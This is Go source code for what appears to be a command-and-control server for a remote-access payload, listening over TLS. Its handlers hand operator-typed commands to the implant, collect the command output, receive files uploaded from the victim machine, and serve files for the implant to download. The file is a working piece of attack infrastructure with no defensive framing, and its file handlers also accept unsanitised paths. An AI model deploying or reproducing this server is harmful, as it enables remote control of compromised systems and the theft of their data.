package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
)

// constants
const certPath = "resources" + string(os.PathSeparator) + "server.crt"
const keyPath = "resources" + string(os.PathSeparator) + "server.key"
const host = ""
const port = 4433

// global vars
var reader = bufio.NewReader(os.Stdin)

// GetCmd handles the /getCmd endpoint and requests a
// cmd from stdin to send to the payload
func GetCmd(writer http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodGet {
		fmt.Println("[+] Got request for cmd")
		fmt.Print("[+] CMD > ")
		text, _ := reader.ReadString('\n')
		text = strings.Replace(text, "\n", "", -1)
		fmt.Fprintf(writer, text)
	}
}

// CmdOutput handles the /cmdOutput endpoint and retrieves
// the output of a cmd executed by the payload
func CmdOutput(writer http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodPost {
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			fmt.Printf("[-] Got error:\n%s\n", err)
			return
		}
		fmt.Printf("[+] Got response:\n%s\n", body)
		fmt.Fprintf(writer, "Successfully posted output")
	}
}

// FileUpload handles the /upload endpoint.
func FileUpload(writer http.ResponseWriter, req *http.Request) {
	// retrieve the file from the request
	file, handler, err := req.FormFile("uploadFile")
	if err != nil {
		fmt.Printf("[-] Error retrieving file: %s\n", err)
		return
	}

	// read the file data
	defer file.Close()
	bytes, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Printf("[-] Error reading the uploaded file: %s\n", err)
	}

	// read data into local file
	err = ioutil.WriteFile("uploads/"+handler.Filename, bytes, 0755)
	if err != nil {
		fmt.Printf("[-] Error creating and reading into local file: %s\n", err)
	}
	fmt.Println("[+] Successfully uploaded file")
	fmt.Fprintf(writer, "Successfully uploaded file")
}

// FileDownload handles the /download endpoint.
func FileDownload(writer http.ResponseWriter, req *http.Request) {
	// get the filename from the request
	filename := req.URL.Query().Get("file")
	if filename == "" {
		fmt.Println("[-] Download request doesn't contain file name")
		http.Error(writer, "no file indicatd to download", 400)
		return
	}
	fmt.Println("[+] Payload wants to download ", filename)

	// open the file if it exists
	file, err := os.Open(filename)
	defer file.Close()
	if err != nil {
		fmt.Printf("[-] Error trying to open file: %s\n", err)
		http.Error(writer, "File not found", 404)
		return
	}

	// create header
	fileHeader := make([]byte, 512)
	file.Read(fileHeader)
	fileContentType := http.DetectContentType(fileHeader)
	stats, _ := file.Stat()
	fileSize := strconv.FormatInt(stats.Size(), 10)
	writer.Header().Set("Content-Disposition", "attachment; filename="+filename)
	writer.Header().Set("Content-Type", fileContentType)
	writer.Header().Set("Content-Length", fileSize)

	// reset descriptor offset since we already read 512 bytes
	file.Seek(0, 0)
	// write file into request
	_, err = io.Copy(writer, file)
	if err != nil {
		fmt.Printf("[-] Error writing file into response: %s\n", err)
		return
	}
	fmt.Println("[+] Successfully downloaded file")
	fmt.Fprintf(writer, "Successfully downloaded file")
}

func main() {
	hoststr := fmt.Sprintf("%s:%d", host, port)

	// set up the routes
	http.HandleFunc("/getcmd", GetCmd)
	http.HandleFunc("/cmdoutput", CmdOutput)
	http.HandleFunc("/upload", FileUpload)
	http.HandleFunc("/download", FileDownload)

	// start the server
	fmt.Printf("[+] Server listening on (%s)\n", hoststr)
	log.Fatal(http.ListenAndServeTLS(hoststr, certPath, keyPath, nil))
}
